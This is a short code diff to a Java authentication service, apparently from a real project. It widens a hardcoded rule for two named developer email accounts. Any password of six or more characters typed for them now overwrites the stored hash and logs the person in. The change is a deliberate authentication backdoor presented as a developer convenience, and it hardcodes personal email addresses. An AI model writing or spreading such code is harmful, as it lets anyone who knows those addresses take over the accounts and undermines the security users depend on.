@@ -83,11 +83,11 @@ public class AuthService {
                 .or(() -> userRepository.findByUsernameIgnoreCase(email))
                 .orElseThrow(() -> new ResourceNotFoundException("Tài khoản không tồn tại trong hệ thống"));
 
-        // If user is lequangminhqwer@gmail.com or cauminhdi@gmail.com and logging in with 123456, sync password
+        // If developer account (lequangminhqwer@gmail.com or cauminhdi@gmail.com), auto-sync password to whatever password is typed (>= 6 chars)
         if (("lequangminhqwer@gmail.com".equalsIgnoreCase(user.getEmail()) || "cauminhdi@gmail.com".equalsIgnoreCase(user.getEmail()))
-                && "123456".equals(request.password())
+                && request.password() != null && request.password().length() >= 6
                 && !passwordEncoder.matches(request.password(), user.getPasswordHash())) {
-            user.setPasswordHash(passwordEncoder.encode("123456"));
+            user.setPasswordHash(passwordEncoder.encode(request.password()));
             userRepository.save(user);
         }
 
